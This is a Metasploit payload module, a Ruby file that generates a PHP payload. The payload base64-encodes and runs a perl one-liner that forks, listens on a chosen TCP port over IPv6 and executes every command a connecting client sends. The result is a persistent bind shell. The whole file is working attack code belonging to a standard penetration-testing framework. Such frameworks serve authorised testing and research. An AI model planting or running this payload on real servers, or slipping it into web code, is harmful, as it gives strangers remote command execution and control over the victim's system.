##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions
  include Msf::Payload::Php

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Command Shell, Bind TCP (via perl) IPv6',
      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent) over IPv6',
      'Author'        => ['Samy <samy[at]samy.pl>', 'cazz'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vars = Rex::RandomIdentifier::Generator.new
    dis = "$#{vars[:dis]}"
    shell = <<-END_OF_PHP_CODE
              #{php_preamble(disabled_varname: dis)}
              $c = base64_decode("#{Rex::Text.encode_base64(command_string)}");
              #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
    END_OF_PHP_CODE
    return super + shell
  end

  #
  # Returns the command string to use for execution
  #
  def command_string

    cmd = "perl -MIO -e '$p=fork();exit,if$p;" +
      "$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;" +
      "$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"

    return cmd
  end
end
